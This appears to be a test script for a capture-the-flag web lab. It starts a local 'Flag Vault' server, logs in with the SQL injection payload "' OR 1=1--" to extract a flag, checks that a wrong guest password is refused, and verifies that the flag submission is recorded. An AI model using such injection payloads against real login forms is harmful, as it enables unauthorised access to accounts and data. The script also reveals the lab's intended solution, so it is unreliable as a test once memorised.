#!/usr/bin/env python3
"""Exercise the Flag Vault service and the flag contract without the platform."""

from __future__ import annotations

import os
import re
import subprocess
import tempfile
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path


def package_root() -> Path:
    return Path(__file__).resolve().parent.parent


def server_path() -> Path:
    installed = Path("/opt/ctf/app/server.py")
    return installed if installed.is_file() else package_root() / "app" / "server.py"


def seed_path() -> Path:
    installed = Path("/opt/ctf/seed/seed.py")
    return installed if installed.is_file() else package_root() / "seed" / "seed.py"


def request(url: str, data: bytes | None = None) -> tuple[int, str]:
    try:
        with urllib.request.urlopen(url, data=data, timeout=5) as response:
            return response.status, response.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as error:
        return error.code, error.read().decode("utf-8", "replace")


def wait_ready(base: str) -> None:
    deadline = time.monotonic() + 15
    while time.monotonic() < deadline:
        try:
            status, _ = request(f"{base}/healthz")
            if status == 200:
                return
        except OSError:
            pass
        time.sleep(0.2)
    raise RuntimeError("server did not become ready")


def main() -> int:
    with tempfile.TemporaryDirectory(prefix="ctf-web-lab-") as work:
        work_path = Path(work)
        db_path = work_path / "app.db"
        proof_path = work_path / "student" / "flag.txt"
        port = 18080
        base = f"http://127.0.0.1:{port}"

        environment = dict(os.environ)
        environment.update(
            {
                "CTF_DB_PATH": str(db_path),
                "CTF_PROOF_PATH": str(proof_path),
                "CTF_PORT": str(port),
            }
        )
        subprocess.run(
            ["/usr/bin/python3", str(seed_path())],
            env=environment,
            check=True,
            stdout=subprocess.DEVNULL,
        )

        server = subprocess.Popen(
            ["/usr/bin/python3", str(server_path())],
            env=environment,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        try:
            wait_ready(base)
            injection = urllib.parse.urlencode(
                {"u": "' OR 1=1--", "p": "irrelevant"}
            )
            status, body = request(f"{base}/login?{injection}")
            match = re.search(r"FLAG\{[^}]+\}", body)
            if status != 200 or match is None:
                raise RuntimeError(f"injection did not disclose the flag: {status} {body!r}")
            flag = match.group(0)
            print("ctf case injection-disclosure passed")

            denied = urllib.parse.urlencode({"u": "guest", "p": "wrong-password"})
            status, body = request(f"{base}/login?{denied}")
            if status != 401 or "FLAG{" in body:
                raise RuntimeError(f"guest login unexpectedly succeeded: {status} {body!r}")
            print("ctf case guest-denied passed")

            submitted = urllib.parse.urlencode({"flag": flag}).encode("utf-8")
            status, _ = request(f"{base}/submit", submitted)
            if status != 200:
                raise RuntimeError(f"submit failed with status {status}")
            recorded = proof_path.read_text(encoding="utf-8").strip()
            if recorded != flag:
                raise RuntimeError(f"proof mismatch: {recorded!r} != {flag!r}")
            print("ctf case proof-recorded passed")
        finally:
            server.terminate()
            try:
                server.wait(timeout=5)
            except subprocess.TimeoutExpired:
                server.kill()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
